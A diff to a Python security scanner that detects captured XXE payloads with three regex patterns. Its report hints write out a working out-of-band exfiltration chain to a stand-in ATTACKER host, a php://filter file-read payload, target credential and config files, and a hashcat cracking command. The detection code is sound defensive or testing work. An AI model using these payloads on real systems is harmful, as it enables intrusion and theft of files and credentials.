@@ -2202,6 +2202,30 @@ _TOMCAT_MANAGER_PATH = re.compile(
     r'(?:manager|host-manager)/(?:html|text|status)'
 )
 
+# iter-251: XXE (XML External Entity) captured payload detector.
+# Fires on captured XML injection attempts. Complements iter-239
+# (LFI response) - when XXE succeeds and reads /etc/passwd, both
+# detectors chain: iter-251 confirms XXE, iter-239 confirms the
+# leaked content.
+#
+# Signal A: inline entity SYSTEM reference:
+#   <!ENTITY xxe SYSTEM "file:///etc/passwd">
+_XXE_INLINE_ENTITY = re.compile(
+    r'(?i)<!ENTITY\s+\w+\s+SYSTEM\s+["\'](?:file://|http://|https://|'
+    r'ftp://|expect://|php://|jar:|netdoc:|dict://|gopher://)[^\'"\r\n]{1,300}["\']'
+)
+# Signal B: OOB parameter entity:
+#   <!ENTITY % xxe SYSTEM "http://attacker/">
+_XXE_OOB_PARAM = re.compile(
+    r'(?i)<!ENTITY\s+%\s+\w+\s+SYSTEM\s+["\']https?://[^\'"\r\n]{1,200}["\']'
+)
+# Signal C: billion-laughs DoS - `<!ENTITY lol "lol">` followed by
+# recursive references.
+_XXE_BILLION_LAUGHS = re.compile(
+    r'(?i)<!ENTITY\s+lol\d*\s+["\']'
+    r'(?:lol|&lol|&#x)[^\'"\r\n]{0,50}["\']'
+)
+
 # iter-250: SSTI (Server-Side Template Injection) captured payload
 # + response detector. Payloads that reflect executed math confirm
 # the vulnerability; canonical exploration payloads (`{{config}}`,
@@ -3348,6 +3372,52 @@ def _multiline_passes(path, report, store):
                                      f"hashcat -m 13100 {_sam}.tgs "
                                      f"rockyou.txt -r rules/best64."
                                      f"rule"))
+
+    # iter-251: XXE captured payload. Fires on any of the three
+    # signals independently - each is dispositive of an XXE attempt
+    # or vulnerability. Doc-file gate applies.
+    if not filters.is_doc_file(path):
+        _xxe_inline = _XXE_INLINE_ENTITY.search(text[:32768])
+        _xxe_oob = _XXE_OOB_PARAM.search(text[:32768])
+        _xxe_lol = _XXE_BILLION_LAUGHS.search(text[:32768])
+        _xxe_anchor = _xxe_inline or _xxe_oob or _xxe_lol
+        if _xxe_anchor:
+            if _xxe_lol:
+                _xxe_kind = "billion-laughs DoS"
+                _xxe_hint = (
+                    "  |  DoS payload - exponentially expanding "
+                    "entities crash the XML parser  |  intel only "
+                    "unless target parser has no entity-expansion "
+                    "limit; won't help exam foothold, note as "
+                    "compliance finding")
+            elif _xxe_oob:
+                _xxe_kind = "OOB (Out-of-Band) XXE"
+                _xxe_hint = (
+                    "  |  OOB pattern - operator is exfiltrating "
+                    "via HTTP to their listener. Full chain: "
+                    "attacker.dtd = `<!ENTITY %% all \"<!ENTITY "
+                    "&#x25; send SYSTEM 'http://ATTACKER/?d=%%file"
+                    ";'>\">%%all;%%send;`  |  request in target "
+                    "XML: `<!DOCTYPE r [<!ENTITY %% ext SYSTEM "
+                    "'http://ATTACKER/dtd'>%%ext;]>`  |  "
+                    "ATTACKER-side HTTP server captures the "
+                    "exfiltrated file")
+            else:
+                _xxe_kind = "in-band file read"
+                _xxe_hint = (
+                    "  |  reads any file the app user can read - "
+                    "primary targets: /etc/passwd, /etc/hosts, "
+                    "/var/lib/tomcat/conf/tomcat-users.xml, "
+                    "/proc/self/environ (needs PHP wrapper: "
+                    "`php://filter/convert.base64-encode/resource="
+                    "/etc/passwd`)  |  Windows: C:\\Windows\\win.ini, "
+                    "C:\\inetpub\\wwwroot\\web.config")
+            report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
+                       _ln(_xxe_anchor),
+                       f"XXE captured: {_xxe_kind}",
+                       hint=(f"payload location: check request body / "
+                             f"URL near anchor line for the ENTITY "
+                             f"declaration{_xxe_hint}"))
 
     # iter-250: SSTI captured payload + response. Fires when EITHER
     # (a) a `{{7*7}}` payload is captured AND `49` reflects nearby,
